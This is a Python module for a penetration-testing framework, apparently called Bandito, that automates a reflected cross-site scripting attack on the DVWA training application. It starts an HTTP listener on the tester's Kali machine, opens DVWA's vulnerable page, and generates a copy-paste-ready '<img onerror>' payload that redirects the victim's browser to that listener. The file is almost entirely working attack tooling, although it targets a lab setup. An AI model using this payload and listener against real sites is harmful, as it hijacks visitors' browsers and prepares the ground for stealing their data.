import requests
import subprocess
import webbrowser
import os
import socket
from datetime import datetime

class Tool:
    def __init__(self):
        self.name = "xss"
        self.description = "Reflected XSS Payload Generator & Server (Part 3)"
        self.kali_ip = self.get_local_ip()
        self.port = 8080
        self.server_process = None
        self.dvwa_url = "http://192.168.107.129"  # change if needed

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "YOUR_KALI_IP_HERE"  # fallback

    def show_help(self):
        print("\n=== Reflected XSS Tool (Part 3) ===")
        print(f"  Kali IP      → {self.kali_ip}")
        print(f"  Server Port  → {self.port}")
        print(f"  DVWA URL     → {self.dvwa_url}\n")
        print("Commands:")
        print("  setup              - Start HTTP server + open DVWA reflected XSS page")
        print("  generate           - Generate payload (copy-paste ready)")
        print("  set ip <your_ip>   - Manually set Kali IP")
        print("  set port <number>  - Change server port")
        print("  set dvwa <url>     - Change DVWA base URL")
        print("  help               - Show this help")
        print("  back / exit        - Return to framework (stops server)\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip().lower()

        if cmd in ["help", "show options"]:
            self.show_help()
            return

        if cmd == "setup":
            self.start_server()
            self.open_dvwa_xss_page()
            return

        if cmd == "generate":
            self.generate_payload()
            return

        if cmd.startswith("set ip"):
            value = cmd.split(maxsplit=2)[2].strip()
            self.kali_ip = value
            print(f"[+] Kali IP set to {self.kali_ip}")
            return

        if cmd.startswith("set port"):
            try:
                self.port = int(cmd.split()[2])
                print(f"[+] Port set to {self.port}")
            except:
                print("Usage: set port <number>")
            return

        if cmd.startswith("set dvwa"):
            value = cmd.split(maxsplit=2)[2].strip()
            self.dvwa_url = value.rstrip("/")
            print(f"[+] DVWA URL set to {self.dvwa_url}")
            return

        if cmd in ["back", "exit", "quit"]:
            if self.server_process:
                print("[*] Stopping HTTP server...")
                self.server_process.terminate()
            print("[*] Returning to main Bandito menu...")
            return

        print("Unknown command. Type 'help' for options.")

    def start_server(self):
        if self.server_process:
            print("[+] HTTP server is already running")
            return

        print(f"[*] Starting HTTP server on http://{self.kali_ip}:{self.port}")
        try:
            self.server_process = subprocess.Popen(
                ["python3", "-m", "http.server", str(self.port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=os.path.expanduser("~")
            )
            print("[+] Server started successfully!")
            print(f"    Waiting for victim redirect to: http://{self.kali_ip}:{self.port}")
        except Exception as e:
            print(f"[-] Failed to start server: {e}")
            print("    Try manually: python3 -m http.server 8080")

    def open_dvwa_xss_page(self):
        xss_url = f"{self.dvwa_url}/vulnerabilities/xss_r/"
        print(f"[+] Opening DVWA Reflected XSS page: {xss_url}")
        webbrowser.open(xss_url)

    def generate_payload(self):
        payload = f'<img src=x onerror="window.location=\'http://{self.kali_ip}:{self.port}/xss_test\'">'

        print("\n=== Reflected XSS Payload (ready to paste) ===")
        print("Go to DVWA Reflected XSS → paste into name field → Submit")
        print("\n" + "="*80)
        print(payload)
        print("="*80)

        # Try to copy to clipboard
        try:
            subprocess.run(["xclip", "-sel", "clip"], input=payload.encode(), check=True)
            print("[+] Payload copied to clipboard!")
        except:
            print("[+] Copy the payload above manually")

        print(f"\nAfter submitting, your HTTP server will log the request from DVWA.")

    def __del__(self):
        if self.server_process:
            try:
                self.server_process.terminate()
            except:
                pass